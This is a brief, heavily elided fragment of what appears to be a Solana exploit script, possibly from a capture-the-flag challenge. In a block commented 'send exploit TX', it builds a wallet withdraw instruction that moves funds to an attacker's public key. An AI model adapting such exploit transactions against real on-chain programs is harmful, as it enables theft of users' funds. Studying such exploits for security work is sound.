...
const walletProgramId = new PublicKey(bs58.decode("5nJJ8dtPCy82QBeesf5jpZSbkSa9mWrBbxCJrHK3apQP"));
...
(async () => {
    ...
    // send exploit TX
    {
        ...
        const ix = Wallet.withdraw(walletProgramId, walletAddress, authorityPublicKey, attacker.publicKey, withdrawAmount);
